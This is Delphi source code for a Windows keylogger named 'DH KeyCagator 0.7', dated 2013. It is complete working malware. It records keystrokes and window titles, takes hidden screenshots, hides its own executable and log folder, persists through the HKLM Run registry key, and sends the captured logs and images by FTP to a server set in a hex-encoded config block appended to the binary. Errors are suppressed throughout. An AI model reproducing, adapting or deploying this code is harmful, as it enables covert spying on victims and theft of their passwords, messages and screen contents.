// DH KeyCagator 0.7
// (C) Doddy Hackman 2013

program keycagator;

// {$APPTYPE CONSOLE}

uses
  SysUtils, Windows, WinInet, ShellApi;

var
  nombrereal: string;
  rutareal: string;
  yalisto: string;
  registro: HKEY;
  dir: string;
  time: integer;

  dir_hide: string;
  time_screen: integer;
  time_ftp: integer;
  ftp_host: Pchar;
  ftp_user: Pchar;
  ftp_password: Pchar;
  ftp_dir: Pchar;

  carpeta: string;
  directorio: string;
  dir_normal: string;
  dir_especial: string;
  ftp_online: string;
  screen_online: string;
  activado: string;

  ob: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  todo: string;

  // Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  try

    begin
      AssignFile(ar, filename);
      FileMode := fmOpenWrite;

      if FileExists(filename) then
        Append(ar)
      else
        Rewrite(ar);

      Write(ar, texto);
      CloseFile(ar);
    end;
  except
    //
  end;

end;

procedure upload_ftpfile(host, username, password, filetoupload,
  conestenombre: Pchar);

// Credits :
// Based on : http://stackoverflow.com/questions/1380309/why-is-my-program-not-uploading-file-on-remote-ftp-server
// Thanks to Omair Iqbal

var
  controluno: HINTERNET;
  controldos: HINTERNET;

begin

  try

    begin
      controluno := InternetOpen(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
      controldos := InternetConnect(controluno, host,
        INTERNET_DEFAULT_FTP_PORT, username, password, INTERNET_SERVICE_FTP,
        INTERNET_FLAG_PASSIVE, 0);
      ftpPutFile(controldos, filetoupload, conestenombre,
        FTP_TRANSFER_TYPE_BINARY, 0);
      InternetCloseHandle(controldos);
      InternetCloseHandle(controluno);
    end
  except
    //
  end;

end;

procedure capturar_pantalla(nombre: string);

// Credits :
// Based on : http://www.delphibasics.info/home/delphibasicssnippets/screencapturewithpurewindowsapi
// Thanks to  www.delphibasics.info and n0v4

var

  uno: integer;
  dos: integer;
  cre: hDC;
  cre2: hDC;
  im: hBitmap;
  archivo: file of byte;
  parriba: TBITMAPFILEHEADER;
  cantidad: pointer;
  data: TBITMAPINFO;

begin


  // Start

  cre := getDC(getDeskTopWindow);
  cre2 := createCompatibleDC(cre);
  uno := getDeviceCaps(cre, HORZRES);
  dos := getDeviceCaps(cre, VERTRES);
  zeromemory(@data, sizeOf(data));


  // Config

  with data.bmiHeader do
  begin
    biSize := sizeOf(TBITMAPINFOHEADER);
    biWidth := uno;
    biheight := dos;
    biplanes := 1;
    biBitCount := 24;

  end;

  with parriba do
  begin
    bfType := ord('B') + (ord('M') shl 8);
    bfSize := sizeOf(TBITMAPFILEHEADER) + sizeOf(TBITMAPINFOHEADER)
      + uno * dos * 3;
    bfOffBits := sizeOf(TBITMAPINFOHEADER);
  end;

  //

  im := createDIBSection(cre2, data, DIB_RGB_COLORS, cantidad, 0, 0);
  selectObject(cre2, im);

  bitblt(cre2, 0, 0, uno, dos, cre, 0, 0, SRCCOPY);

  releaseDC(getDeskTopWindow, cre);

  // Make Photo

  AssignFile(archivo, nombre);
  Rewrite(archivo);

  blockWrite(archivo, parriba, sizeOf(TBITMAPFILEHEADER));
  blockWrite(archivo, data.bmiHeader, sizeOf(TBITMAPINFOHEADER));
  blockWrite(archivo, cantidad^, uno * dos * 3);

end;

procedure capturar_teclas;

var
  I: integer;
  Result: Longint;
  mayus: integer;
  shift: integer;

const

  n_numeros_izquierda: array [1 .. 10] of string =
    ('48', '49', '50', '51', '52', '53', '54', '55', '56', '57');

const
  t_numeros_izquierda: array [1 .. 10] of string =
    ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');

const
  n_numeros_derecha: array [1 .. 10] of string =
    ('96', '97', '98', '99', '100', '101', '102', '103', '104', '105');

const
  t_numeros_derecha: array [1 .. 10] of string =
    ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');

const
  n_shift: array [1 .. 22] of string = ('48', '49', '50', '51', '52', '53',
    '54', '55', '56', '57', '187', '188', '189', '190', '191', '192', '193',
    '291', '220', '221', '222', '226');

const
  t_shift: array [1 .. 22] of string = (')', '!', '@', '#', '\$', '%', '¨',
    '&', '*', '(', '+', '<', '_', '>', ':', '\', ' ? ', ' / \ ', '}', '{', '^',
    '|');

const
  n_raros: array [1 .. 17] of string = ('1', '8', '13', '32', '46', '187',
    '188', '189', '190', '191', '192', '193', '219', '220', '221', '222',
    '226');

const
  t_raros: array [1 .. 17] of string = ('[mouse click]', '[backspace]',
    '<br>[enter]<br>', '[space]', '[suprimir]', '=', ',', '-', '.', ';', '\',
    ' / ', ' \ \ \ ', ']', '[', '~', '\/');

begin

  while (1 = 1) do
  begin

    Sleep(time); // Time

    try

      begin

        // Others

        for I := Low(n_raros) to High(n_raros) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_raros[I]));
          If Result = -32767 then
          begin
            savefile('logs.html', t_raros[I]);
          end;
        end;

        // SHIFT

        if (GetAsyncKeyState(VK_SHIFT) <> 0) then
        begin

          for I := Low(n_shift) to High(n_shift) do
          begin
            Result := GetAsyncKeyState(StrToInt(n_shift[I]));
            If Result = -32767 then
            begin
              savefile('logs.html', t_shift[I]);
            end;
          end;

          for I := 65 to 90 do
          begin
            Result := GetAsyncKeyState(I);
            If Result = -32767 then
            Begin
              savefile('logs.html', Chr(I + 0));
            End;
          end;

        end;

        // Numbers

        for I := Low(n_numeros_derecha) to High(n_numeros_derecha) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_numeros_derecha[I]));
          If Result = -32767 then
          begin
            savefile('logs.html', t_numeros_derecha[I]);
          end;
        end;

        for I := Low(n_numeros_izquierda) to High(n_numeros_izquierda) do
        begin
          Result := GetAsyncKeyState(StrToInt(n_numeros_izquierda[I]));
          If Result = -32767 then
          begin
            savefile('logs.html', t_numeros_izquierda[I]);
          end;
        end;

        // MAYUS

        if (GetKeyState(20) = 0) then
        begin
          mayus := 32;
        end
        else
        begin
          mayus := 0;
        end;

        for I := 65 to 90 do
        begin
          Result := GetAsyncKeyState(I);
          If Result = -32767 then
          Begin
            savefile('logs.html', Chr(I + mayus));
          End;
        end;
      end;
    except
      //
    end;

  end;
end;

procedure capturar_ventanas;
var
  ventana1: array [0 .. 255] of Char;
  nombre1: string;
  Nombre2: string; //
begin
  while (1 = 1) do
  begin

    try

      begin
        Sleep(time); // Time

        GetWindowText(GetForegroundWindow, ventana1, sizeOf(ventana1));

        nombre1 := ventana1;

        if not(nombre1 = Nombre2) then
        begin
          Nombre2 := nombre1;
          savefile('logs.html',
            '<hr style=color:#00FF00><h2><center>' + Nombre2 +
              '</h2></center><br>');
        end;

      end;
    except
      //
    end;
  end;

end;

procedure capturar_pantallas;
var
  generado: string;
begin
  while (1 = 1) do
  begin

    Sleep(time_screen);

    generado := IntToStr(Random(100)) + '.jpg';

    try

      begin
        capturar_pantalla(generado);
      end;
    except
      //
    end;

    SetFileAttributes(Pchar(dir + '/' + generado), FILE_ATTRIBUTE_HIDDEN);

    savefile('logs.html', '<br><br><center><img src=' + generado +
        '></center><br><br>');

  end;
end;

procedure subirftp;
var
  busqueda: TSearchRec;
begin
  while (1 = 1) do
  begin

    try

      begin
        Sleep(time_ftp);

        upload_ftpfile(ftp_host, ftp_user, ftp_password, Pchar
            (dir + 'logs.html'), Pchar(ftp_dir + 'logs.html'));

        FindFirst(dir + '*.jpg', faAnyFile, busqueda);

        upload_ftpfile(ftp_host, ftp_user, ftp_password, Pchar
            (dir + busqueda.Name), Pchar(ftp_dir + busqueda.Name));
        while FindNext(busqueda) = 0 do
        begin
          upload_ftpfile(ftp_host, ftp_user, ftp_password, Pchar
              (dir + '/' + busqueda.Name), Pchar(ftp_dir + busqueda.Name));
        end;
      end;
    except
      //
    end;
  end;
end;

procedure control;
var
  I: integer;
  re: Longint;
begin

  while (1 = 1) do
  begin

    try

      begin

        Sleep(time);

        if (GetAsyncKeyState(VK_SHIFT) <> 0) then
        begin

          re := GetAsyncKeyState(120);
          If re = -32767 then
          Begin

            ShellExecute(0, nil, Pchar(dir + 'logs.html'), nil, nil,
              SW_SHOWNORMAL);

          End;
        end;
      end;
    except
      //
    end;
  End;
end;

//

begin

  try

    // Config

    try

      begin

        // Edit

        ob := INVALID_HANDLE_VALUE;
        code := '';

        ob := CreateFile(Pchar(paramstr(0)), GENERIC_READ, FILE_SHARE_READ,
          nil, OPEN_EXISTING, 0, 0);
        if (ob <> INVALID_HANDLE_VALUE) then
        begin
          SetFilePointer(ob, -9999, nil, FILE_END);
          ReadFile(ob, code, 9999, nose, nil);
          CloseHandle(ob);
        end;

        todo := regex(code, '[63686175]', '[63686175]');
        todo := dhencode(todo, 'decode');

        dir_especial := Pchar(regex(todo, '[opsave]', '[opsave]'));
        directorio := regex(todo, '[save]', '[save]');
        carpeta := regex(todo, '[folder]', '[folder]');
        screen_online := regex(todo, '[capture_op]', '[capture_op]');
        time_screen := StrToInt(regex(todo, '[capture_seconds]',
            '[capture_seconds]'));
        ftp_online := Pchar(regex(todo, '[ftp_op]', '[ftp_op]'));
        time_ftp := StrToInt(regex(todo, '[ftp_seconds]', '[ftp_seconds]'));
        ftp_host := Pchar(regex(todo, '[ftp_host]', '[ftp_host]'));
        ftp_user := Pchar(regex(todo, '[ftp_user]', '[ftp_user]'));
        ftp_password := Pchar(regex(todo, '[ftp_pass]', '[ftp_pass]'));
        ftp_dir := Pchar(regex(todo, '[ftp_path]', '[ftp_path]'));

        dir_normal := dir_especial;

        time := 100; // Not Edit

        if (dir_normal = '1') then
        begin
          dir_hide := directorio;
        end
        else
        begin
          dir_hide := GetEnvironmentVariable(directorio) + '/';
        end;

        dir := dir_hide + carpeta + '/';

        if not(DirectoryExists(dir)) then
        begin
          CreateDir(dir);
        end;

        ChDir(dir);

        nombrereal := ExtractFileName(paramstr(0));
        rutareal := dir;
        yalisto := dir + nombrereal;

        MoveFile(Pchar(paramstr(0)), Pchar(yalisto));

        SetFileAttributes(Pchar(dir), FILE_ATTRIBUTE_HIDDEN);

        SetFileAttributes(Pchar(yalisto), FILE_ATTRIBUTE_HIDDEN);

        savefile(dir + '/logs.html', '');

        SetFileAttributes(Pchar(dir + '/logs.html'), FILE_ATTRIBUTE_HIDDEN);

        savefile('logs.html',
          '<style>body {background-color: black;color:#00FF00;cursor:crosshair;}</style>');

        RegCreateKeyEx(HKEY_LOCAL_MACHINE,
          'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
          REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, registro, nil);
        RegSetValueEx(registro, 'uberk', 0, REG_SZ, Pchar(yalisto), 666);
        RegCloseKey(registro);
      end;
    except
      //
    end;

    // End

    // Start the party

    BeginThread(nil, 0, @capturar_teclas, nil, 0, PDWORD(0)^);
    BeginThread(nil, 0, @capturar_ventanas, nil, 0, PDWORD(0)^);

    if (screen_online = '1') then
    begin
      BeginThread(nil, 0, @capturar_pantallas, nil, 0, PDWORD(0)^);
    end;
    if (ftp_online = '1') then
    begin
      BeginThread(nil, 0, @subirftp, nil, 0, PDWORD(0)^);
    end;

    BeginThread(nil, 0, @control, nil, 0, PDWORD(0)^);

    // Readln;

    while (1 = 1) do
      Sleep(time);

  except
    //
  end;

end.

// The End ?
